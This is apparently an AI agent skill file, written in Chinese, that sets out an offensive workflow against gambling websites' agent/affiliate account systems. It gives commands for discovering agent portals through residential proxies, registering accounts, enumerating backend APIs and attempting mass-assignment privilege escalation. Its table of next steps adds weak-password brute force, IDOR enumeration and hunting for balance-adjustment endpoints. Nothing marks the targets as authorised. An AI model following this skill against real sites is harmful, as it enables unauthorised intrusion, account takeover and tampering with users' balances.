---
name: 使探针
description: >-
 大爱仙尊·Skill: 博彩站代理商账号体系探针
---

# 博彩站代理商账号体系探针

## 核心原理

博彩站有三层账号体系（权限递增）：
```
普通用户 < 代理商 (agent/affiliate) < 运营商 (operator) < admin
```

**代理商注册入口几乎全部开放**——因为博彩站需要靠代理商拉新用户。
代理商账号比普通账号拥有 10 倍的 API 攻击面，且代理商后台防护往往比 admin 弱得多。

## 工具

```
炼蛊房/agent_probe.py
```

## 四步作战流程

```bash
# Step 1: 发现代理商入口（路径+子域双重扫描）
python3 炼蛊房/agent_probe.py discover \
 --base https://TARGET --case CASE \
 --proxy http://住宅IP:端口

# Step 2: 尝试注册代理商账号（自动试多种参数格式）
python3 炼蛊房/agent_probe.py register \
 --base https://TARGET --case CASE

# Step 3: 登录成功后，枚举代理商后台所有 API
python3 炼蛊房/agent_probe.py api-enum \
 --base https://agent.TARGET --token <登录token> --case CASE

# Step 4: 尝试账号等级越权篡改（Mass Assignment）
python3 炼蛊房/agent_probe.py level \
 --base https://TARGET --token <token> --case CASE
```

## 高价值发现后的联动

| 发现 | 下一步 |
|------|--------|
| `/agent/login` 无 Cloudflare 直连 | 直接弱口令爆破（`dict/gambling_admin_passwords.txt`）|
| 代理商注册成功 | `api-enum` 枚举后台 API；找 addBonus/transfer/adjustBalance |
| 代理商 API 未鉴权 | 越权操作所有下级用户；IDOR 枚举 |
| `level` 字段可篡改 | 账号提升为代理商/运营商，解锁更多 API |
| 代理商后台是 Vue/React SPA | APK 逆向或 JS 逆向找隐藏 API 路由 |

## 代理商后台常用 API（枚举时自动覆盖）

- `/api/agent/users` — 查看所有下级用户
- `/api/agent/balance` — 查看佣金/余额
- `/api/agent/addMember` — 创建下级账号
- `/api/agent/adjustBalance` — 调整余额 ← 关键
- `/api/agent/report` — 财务报表
- `/api/agent/commission` — 佣金结算

## 代理商子域模式（discover 自动扫）

`agent.` / `affiliate.` / `partner.` / `proxy.` / `daili.` / `aff.` / `promo.` 等

## 证据落盘

```
案卷/<案卷>/案卷/agent/
 agent_discover.json 发现的入口列表
 agent_register.json 注册结果（含 token）
 agent_api_enum.json API 枚举结果
 level_escalation.json 等级篡改命中
```

## 真源

- 手法：`传承/春秋蝉·分案.md`
